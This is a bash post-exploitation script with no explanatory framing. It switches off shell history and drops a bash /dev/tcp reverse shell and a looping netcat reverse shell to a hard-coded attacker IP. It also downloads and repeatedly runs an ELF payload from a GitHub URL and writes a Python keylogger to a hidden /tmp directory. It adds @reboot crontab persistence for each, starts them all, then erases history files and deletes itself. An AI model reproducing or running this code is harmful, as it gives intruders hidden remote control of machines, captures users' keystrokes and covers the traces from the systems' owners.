#!/bin/bash

# --- Disable history tracking ---
unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0
set +o history 2>/dev/null

# --- Configurable Variables ---
ATTACKER_IP="172.16.17.39"
ATTACKER_PORT_1="4444"   # For Bash reverse shell
ATTACKER_PORT_2="5555"   # For Netcat shell
TMP_DIR="/tmp/.sysd"
REVSHELL_BASH="$TMP_DIR/revshell.sh"
REVSHELL_NC="$TMP_DIR/ncshell.sh"
ELF_PAYLOAD="$TMP_DIR/shell.elf"
KEYLOGGER="$TMP_DIR/keylogger.py"

# --- Create working directory ---
mkdir -p "$TMP_DIR"

# --- Payload 1: Bash Reverse Shell ---
cat > "$REVSHELL_BASH" <<EOF
#!/bin/bash
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT_1 0>&1
EOF
chmod +x "$REVSHELL_BASH"

# --- Payload 2: Netcat Reverse Shell ---
cat > "$REVSHELL_NC" <<EOF
#!/bin/bash
while true; do
  nc $ATTACKER_IP $ATTACKER_PORT_2 -e /bin/bash
  sleep 10
done
EOF
chmod +x "$REVSHELL_NC"

# --- ELF Payload Download and Loop Execution ---
curl -s -L https://raw.githubusercontent.com/diedromeo/htopclone/main/shell.elf -o "$ELF_PAYLOAD"
chmod +x "$ELF_PAYLOAD"

cat > "$TMP_DIR/elf_loop.sh" <<EOF
#!/bin/bash
while true; do
  "$ELF_PAYLOAD" >/dev/null 2>&1
  sleep 5
done
EOF
chmod +x "$TMP_DIR/elf_loop.sh"

# --- Keylogger Python Script ---
cat > "$KEYLOGGER" <<EOF
from pynput import keyboard

def on_press(key):
    with open("/tmp/.sysd/keys.log", "a") as f:
        f.write(str(key) + "\\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
EOF

# --- Add Persistence (via crontab) ---
(crontab -l 2>/dev/null; echo "@reboot bash $REVSHELL_BASH &") | crontab -
(crontab -l 2>/dev/null; echo "@reboot bash $REVSHELL_NC &") | crontab -
(crontab -l 2>/dev/null; echo "@reboot bash $TMP_DIR/elf_loop.sh &") | crontab -
(crontab -l 2>/dev/null; echo "@reboot python3 $KEYLOGGER &") | crontab -

# --- Execute everything NOW ---
bash "$REVSHELL_BASH" >/dev/null 2>&1 &
bash "$REVSHELL_NC" >/dev/null 2>&1 &
bash "$TMP_DIR/elf_loop.sh" >/dev/null 2>&1 &
python3 "$KEYLOGGER" >/dev/null 2>&1 &

# --- Clean up command traces ---
sleep 1
rm -f ~/.bash_history ~/.zsh_history
history -c 2>/dev/null
[ -f "$0" ] && rm -- "$0"

exit 0
